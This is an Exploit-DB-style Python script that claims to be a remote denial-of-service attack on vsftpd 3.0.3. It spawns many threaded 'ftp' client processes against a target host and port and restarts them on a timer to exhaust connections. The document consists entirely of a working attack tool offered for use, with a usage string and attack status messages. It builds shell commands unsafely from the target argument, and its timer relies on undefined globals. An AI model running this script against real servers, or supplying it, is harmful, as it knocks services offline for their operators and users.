# Exploit Title: vsftpd 3.0.3 - Remote Denial of Service
# Date: 22-03-2021
# Exploit Author: xynmaps
# Vendor Homepage: https://security.appspot.com/vsftpd.html
# Software Link: https://security.appspot.com/downloads/vsftpd-3.0.3.tar.gz
# Version: 3.0.3
# Tested on: Parrot Security OS 5.9.0

import socket
import sys
import threading
import subprocess
import time
import signal

banner = """
._________________.
|     VS-FTPD     |
|      D o S      |
|_________________|
|                 |
|By XYN/DUMP/NSKB3|
|_________________|
|                 |
|___mod version___|
|---kuppamjohari--|
|_________________|
|_|_|_|_____|_|_|_|
|_|_|_|_|_|_|_|_|_|

Exploit Author: xynmaps
Modified By: kuppamjohari
Press Ctrl+C to cancel the program at any time.
"""

usage = "{} <TARGET> <PORT(DEFAULT:21)> <MAX_CONNS(DEFAULT:50)>".format(sys.argv[0])

# Flag to control the attack loop
running = True

def test(t, p):
    s = socket.socket()
    s.settimeout(10)
    try:
        s.connect((t, p))
        response = s.recv(65535)
        s.close()
        return True
    except socket.error:
        print("Port {} is not open, please specify an open port.".format(p))
        sys.exit()

def attack(targ, po, id):
    try:
        subprocess.Popen("ftp {0} {1}".format(targ, po), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    except OSError:
        pass

def timer(loop_thread, interval=900):
    start = time.time()
    while running:
        if time.time() - start >= interval:
            subprocess.Popen("pkill ftp", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            if loop_thread.is_alive():
                loop_thread.join()
            loop_thread = threading.Thread(target=loop, args=(target, port, conns))
            loop_thread.start()
            start = time.time()

def loop(target, port, conns):
    while running:
        threads = []
        for i in range(1, conns + 1):
            if not running:
                break
            t = threading.Thread(target=attack, args=(target, port, i))
            threads.append(t)
            t.start()

        for t in threads:
            t.join()

def signal_handler(sig, frame):
    global running
    print("\n[!] Attack cancelled. Cleaning up...")
    running = False
    subprocess.Popen("pkill ftp", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    sys.exit(0)

def main():
    print(banner)
    try:
        target = sys.argv[1]
    except IndexError:
        print(usage)
        sys.exit()

    try:
        port = int(sys.argv[2])
    except (IndexError, ValueError):
        port = 21

    try:
        conns = int(sys.argv[3])
    except (IndexError, ValueError):
        conns = 50

    print("[!] Testing if {}:{} is open".format(target, port))
    if not test(target, port):
        sys.exit()

    print("[+] Port {} open, starting attack...".format(port))
    time.sleep(2)
    print("[+] Attack started on {}:{}!".format(target, port))

    loop_thread = threading.Thread(target=loop, args=(target, port, conns))
    loop_thread.start()
    timer(loop_thread)

if __name__ == "__main__":
    # Register signal handler for graceful exit
    signal.signal(signal.SIGINT, signal_handler)
    main()
